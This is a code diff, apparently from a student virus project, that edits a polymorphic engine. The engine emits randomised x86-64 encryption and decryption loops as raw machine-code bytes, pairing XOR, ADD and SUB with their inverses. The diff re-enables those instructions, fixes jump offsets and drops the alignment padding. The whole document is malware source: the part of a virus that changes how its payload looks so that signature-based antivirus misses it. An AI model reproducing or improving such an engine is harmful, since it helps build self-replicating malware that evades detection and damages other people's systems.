@@ -32,18 +32,13 @@
 enum
 {
 	I_BASE,
-	// XOR_RM64_IMM8,		// REX.W + 83 /6 ib XOR r/m64, imm8
-	// ADD_RM64_IMM8,		// REX.W + 83 /0 ib ADD r/m64, imm8
-	// SUB_RM64_IMM8,		// REX.W + 83 /5 ib SUB r/m64, imm8
+	XOR_RM64_IMM8,		// REX.W + 83 /6 ib XOR r/m64, imm8
+	ADD_RM64_IMM8,		// REX.W + 83 /0 ib ADD r/m64, imm8
+	SUB_RM64_IMM8,		// REX.W + 83 /5 ib SUB r/m64, imm8
 
-	// XOR_RAX_IMM32,		// REX.W + 35 id XOR RAX, imm32
-	// ADD_RAX_IMM32,		// REX.W + 05 id ADD RAX, imm32
-	// SUB_RAX_IMM32,		// REX.W + 2D id SUB RAX, imm32
-
-	BSWAP_R64,		// REX.W + 0F C8+rd BSWAP r64, rd=0 for rax
-
-	// ROL
-	// ROR
+	XOR_RAX_IMM32,		// REX.W + 35 id XOR RAX, imm32
+	ADD_RAX_IMM32,		// REX.W + 05 id ADD RAX, imm32
+	SUB_RAX_IMM32,		// REX.W + 2D id SUB RAX, imm32
 	I_SIZE
 };
 
@@ -111,27 +106,26 @@ static void		encode_instruction(uint8_t *buffer,
 	/* Immediate */
 	if (i.immediate)
 		memcpy(buffer, &immediate, i.immediate);
+	// if (*buffer) buffer += operand_size;
 }
 
 static struct x86_64_encode	select_instruction(uint64_t *seed, int8_t operation)
 {
 	struct x86_64_encode		instructions[I_SIZE];
-	// instructions[XOR_RM64_IMM8] = (struct x86_64_encode){4, 0b0100,0b1,0,0,0, 0,   0,0x83, 0b11,0b110,0b000, 0,0,0, 0,IMM_IB};
-	// instructions[ADD_RM64_IMM8] = (struct x86_64_encode){4, 0b0100,0b1,0,0,0, 0,   0,0x83, 0b11,0b000,0b000, 0,0,0, 0,IMM_IB};
-	// instructions[SUB_RM64_IMM8] = (struct x86_64_encode){4, 0b0100,0b1,0,0,0, 0,   0,0x83, 0b11,0b101,0b000, 0,0,0, 0,IMM_IB};
-	// instructions[XOR_RAX_IMM32] = (struct x86_64_encode){6, 0b0100,0b1,0,0,0, 0,   0,0x35,    0,    0,    0, 0,0,0, 0,IMM_ID};
-	// instructions[ADD_RAX_IMM32] = (struct x86_64_encode){6, 0b0100,0b1,0,0,0, 0,   0,0x05,    0,    0,    0, 0,0,0, 0,IMM_ID};
-	// instructions[SUB_RAX_IMM32] = (struct x86_64_encode){6, 0b0100,0b1,0,0,0, 0,   0,0x2d,    0,    0,    0, 0,0,0, 0,IMM_ID};
-	instructions[BSWAP_R64]     = (struct x86_64_encode){3, 0b0100,0b1,0,0,0, 0,0x0f,0xc8,    0,    0,    0, 0,0,0, 0,     0};
+	instructions[XOR_RM64_IMM8] = (struct x86_64_encode){4, 0b0100,0b1,0,0,0, 0,0,0x83, 0b11,0b110,0b000, 0,0,0, 0,IMM_IB};
+	instructions[ADD_RM64_IMM8] = (struct x86_64_encode){4, 0b0100,0b1,0,0,0, 0,0,0x83, 0b11,0b000,0b000, 0,0,0, 0,IMM_IB};
+	instructions[SUB_RM64_IMM8] = (struct x86_64_encode){4, 0b0100,0b1,0,0,0, 0,0,0x83, 0b11,0b101,0b000, 0,0,0, 0,IMM_IB};
+	instructions[XOR_RAX_IMM32] = (struct x86_64_encode){6, 0b0100,0b1,0,0,0, 0,0,0x35, 0,0,0, 0,0,0, 0,IMM_ID};
+	instructions[ADD_RAX_IMM32] = (struct x86_64_encode){6, 0b0100,0b1,0,0,0, 0,0,0x05, 0,0,0, 0,0,0, 0,IMM_ID};
+	instructions[SUB_RAX_IMM32] = (struct x86_64_encode){6, 0b0100,0b1,0,0,0, 0,0,0x2d, 0,0,0, 0,0,0, 0,IMM_ID};
 
 	int				instructions_match[I_SIZE];
-	// instructions_match[XOR_RM64_IMM8] = XOR_RM64_IMM8;
-	// instructions_match[ADD_RM64_IMM8] = SUB_RM64_IMM8;
-	// instructions_match[SUB_RM64_IMM8] = ADD_RM64_IMM8;
-	// instructions_match[XOR_RAX_IMM32] = XOR_RAX_IMM32;
-	// instructions_match[ADD_RAX_IMM32] = SUB_RAX_IMM32;
-	// instructions_match[SUB_RAX_IMM32] = ADD_RAX_IMM32;
-	instructions_match[BSWAP_R64]     = BSWAP_R64;
+	instructions_match[XOR_RM64_IMM8] = XOR_RM64_IMM8;
+	instructions_match[ADD_RM64_IMM8] = SUB_RM64_IMM8;
+	instructions_match[SUB_RM64_IMM8] = ADD_RM64_IMM8;
+	instructions_match[XOR_RAX_IMM32] = XOR_RAX_IMM32;
+	instructions_match[ADD_RAX_IMM32] = SUB_RAX_IMM32;
+	instructions_match[SUB_RAX_IMM32] = ADD_RAX_IMM32;
 
 	uint64_t	instruction = random_exrange(seed, I_BASE, I_SIZE);
 
@@ -193,6 +187,8 @@ static void	generate_unshuffler(char *buffer, uint64_t seed, size_t size)
 static struct safe_ptr    generate_loop_frame(char *buffer, size_t size)
 {
 	PD_ARRAY(uint8_t, header,
+		0x48, 0xc1, 0xee, 0x03,             /*     shr rsi, 0x3       */
+		0x48, 0xc1, 0xe6, 0x03,             /*     shl rsi, 0x3       */
 		0x48, 0x85, 0xf6,                   /* cypher: test rsi, rsi  */
 		0x0f, 0x84, 0x14, 0x00, 0x00, 0x00, /*     jz cypher_end      */
 		0x48, 0x8b, 0x07                    /*     mov rax, [rdi]     */
@@ -200,9 +196,9 @@ static struct safe_ptr    generate_loop_frame(char *buffer, size_t size)
 
 	PD_ARRAY(uint8_t, footer,
 		0x48, 0x89, 0x07,                   /*     mov [rdi], rax     */
-		0x48, 0x83, 0xc7, 0x08,             /*     add rdi, 0x08      */
-		0x48, 0x83, 0xee, 0x08,             /*     sub rsi, 0x08      */
-		0xe9, 0xe9, 0xff, 0xff, 0xff,       /*     jmp cypher         */
+		0x48, 0x83, 0xc7, 0x08,             /*     add rdi, 0x8       */
+		0x48, 0x83, 0xee, 0x08,             /*     sub rsi, 0x8       */
+		0xe9, 0xe4, 0xff, 0xff, 0xff,       /*     jmp cypher         */
 		0xc3                                /* cypher_end: ret        */
 	);
 
@@ -212,8 +208,8 @@ static struct safe_ptr    generate_loop_frame(char *buffer, size_t size)
 	char	*remaining_buffer = buffer + sizeof(header);
 	size_t	remaining_size    = size - sizeof(footer) - sizeof(header);
 
-	int16_t *rel_cypher_end = (int16_t *)&header[5];
-	int16_t *rel_cypher     = (int16_t *)&footer[9];
+	int16_t *rel_cypher_end = (int16_t *)&header[13];
+	int16_t *rel_cypher     = (int16_t *)&footer[12];
 
 	// check for overflows and underflows
 	if (*rel_cypher_end + (uint16_t)remaining_size < *rel_cypher_end
@@ -236,15 +232,6 @@ bool		generate_cypher(char *buffer, uint64_t seed, size_t size)
 	frame = generate_loop_frame(buffer, size);
 	if (frame.ptr == NULL) return errors(ERR_VIRUS, _ERR_GEN_LOOP_FRAME);
 
-	#ifdef DEBUG
-	if (frame.size < 8) sys_exit(errors(ERR_VIRUS, ERR_IMPOSSIBLE));
-	#endif
-
-	size_t		padding = frame.size % 8;
-
-	frame.ptr  += padding;
-	frame.size -= padding;
-
 	generate_shuffler(frame.ptr, seed, frame.size);
 	return true;
 }
@@ -255,15 +242,6 @@ bool		generate_decypher(char *buffer, uint64_t seed, size_t size)
 
 	frame = generate_loop_frame(buffer, size);
 	if (frame.ptr == NULL) return errors(ERR_VIRUS, _ERR_GEN_LOOP_FRAME);
-
-	#ifdef DEBUG
-	if (frame.size < 8) sys_exit(errors(ERR_VIRUS, ERR_IMPOSSIBLE));
-	#endif
-
-	size_t		padding = frame.size % 8;
-
-	frame.ptr  += padding;
-	frame.size -= padding;
 
 	generate_unshuffler(frame.ptr, seed, frame.size);
 	return true;
